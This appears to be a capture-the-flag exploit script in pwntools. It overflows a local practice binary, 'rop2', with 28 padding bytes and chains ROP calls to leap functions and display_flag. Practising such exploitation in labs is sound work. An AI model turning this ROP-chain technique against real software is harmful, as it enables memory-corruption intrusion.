#! /usr/bin/env python2
from pwn import *
context(arch='i386', os='linux')
context.terminal = ['zsh', '-e', 'sh', '-c']

p = process("./rop2")
#p = gdb.debug('./vuln', '''break *win_fn''')
e = ELF('./rop2')
leapA = e.sym['leapA']
leap2 = e.sym['leap2']
leap3 = e.sym['leap3']
display_flag = e.sym['display_flag']

rop1 = ROP("./rop2")
rop1.call(leapA)
#print(rop1.dump())

rop2 = ROP("./rop2")
rop2.call(leap2, [0xDEADBEEF])

rop3 = ROP("./rop2")
rop3.call(leap3)

rop4 = ROP("./rop2")
rop4.call(display_flag)

payload = 'A' * 28 + rop1.chain() + rop3.chain() + rop2.chain()+ rop4.chain()
#+ rop3.chain() + rop2.chain() + rop4.chain()

p.recvuntil('Enter your input>')
p.sendline(payload)
p.interactive()


